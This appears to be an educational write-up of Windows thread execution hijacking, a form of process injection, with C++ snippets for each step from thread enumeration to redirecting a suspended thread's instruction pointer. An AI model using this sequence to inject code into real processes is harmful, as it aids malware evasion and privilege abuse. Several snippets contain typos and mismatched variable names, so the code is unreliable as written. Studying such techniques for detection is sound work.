# Process Injection: Thread Execution Hijacking

## Overview

Process injection is a technique used by attackers to inject malicious code into the address space of another process. This allows them to prevent detection and elevate privileges. 

One of the sub-techniques of process injection is Thread Execution Hijacking, also known as Suspend, Inject, and Resume (SIR). This technique avoids the creation of new processes or threads, which can be noisy and more easily detected by security measures.

## High-Level Steps

Thread execution hijacking can be broken down into the following high-level steps:

1. **Locate and open a target process to control.**
2. **Allocate a memory region for malicious code.**
3. **Write malicious code to the allocated memory.**
4. **Identify the thread ID of the target thread to hijack.**
5. **Open the target thread.**
6. **Suspend the target thread.**
7. **Obtain the thread context.**
8. **Update the instruction pointer to the malicious code.**
9. **Rewrite the target thread context.**
10. **Resume the hijacked thread.**

## Detailed Steps

### 1. Locate and Open a Target Process to Control

The attacker identifies a running process to hijack, usually one with higher privileges or access to sensitive information. Functions like `CreateToolhelp32Snapshot()`, `Thread32First()`, and `Thread32Next()` are used to enumerate through the existing threads of a target process.

#### CreateTOolhelp32Snapshort() : Takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes. It inclues lot of parameters such as

***Snapshot: A collection of system objects captured at a point in time***

- TH32CS_SNAPHEAPLIST: Includes the heap list of the process specified in th32ProcessID.
- TH32CS_SNAPPROCESS: Includes all processes in the system.
- TH32CS_SNAPTHREAD: Includes all threads in the system.
- TH32CS_SNAPMODULE: Includes all modules of the process specified in th32ProcessID.
- TH32CS_SNAPMODULE32: Includes all 32-bit modules of the process specified in th32ProcessID when running on a 64-bit system.
- TH32CS_SNAPALL: Includes all of the above.

#### Thread32First() : Retrieves information about the first thread of any process encountered in a system snapshot.
#### Thread32Next(): Retrieves information about the next thread of any process encountered in the system memory snapshot.

```cpp
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specified process
    TH32CS_SNAPTHREAD, // Include all threads in the system
    0 // Indicates the current process
);
Bool Thread32First( // Obtains the first thread in the snapshot
    hSnapshot, // Handle of the snapshot
    &threadEntry // Pointer to the THREADENTRY32 structure
    // Describes an entry from a list of the threads executing in the system when a snapshot was taken.
);

while (Thread32Next( // Obtains the next thread in the snapshot
    hSnapshot, // Handle of the snapshot
    &threadEntry // Pointer to the THREADENTRY32 structure
)) {
    // Iterate through threads
}
```

### 2. Allocate Memory Region for Malicious Code

Memory within the address space of the target process is allocated for the malicious code using `VirtualAllocEx`.

#### VirtualAllocEx() Reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero.

```cpp 
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

```
### 3. Write Malicious Code to Allocated Memory

The attacker writes the malicious code or a DLL path into the allocated memory using `WriteProcessMemory`.

```cpp 
WriteProcessMemory(hProcess, pRemoteCode, payload, payloadSize, NULL);

```

### 4. Identify the Thread ID of the Target Thread to Hijack

Enumerate through the threads of the target process to find the thread to hijack, using the `THREADENTRY32` structure and functions like `Thread32First` and `Thread32Next`.

### 5. Open the Target Thread

Using `OpenThread`, the attacker obtains a handle to the target thread.

```cpp

if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}

 ```

### 6. Suspend the Target Thread

The identified thread within the process is suspended using the `SuspendThread` API call.
```cpp
SuspendThread(hThread);
```

### 7. Obtain the Thread Context

The context of the suspended thread, which includes the thread's register states and execution pointers, is retrieved using `GetThreadContext`.

```cpp
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);
```

### 8. Update the Instruction Pointer to the Malicious Code

The instruction pointer in the thread's context is updated to point to the address of the injected malicious code.

```cpp
ctx.Rip = (DWORD64)pRemoteCode; // For 64-bit systems
```

### 9. Rewrite the Target Thread Context

The modified context is then written back to the thread using `SetThreadContext`.

```cpp
SetThreadContext(hThread, &ctx);

```

### 10. Resume the Hijacked Thread

Finally, the thread is resumed using the `ResumeThread` API call, causing it to execute the injected malicious code.

```cpp
ResumeThread(hThread);

```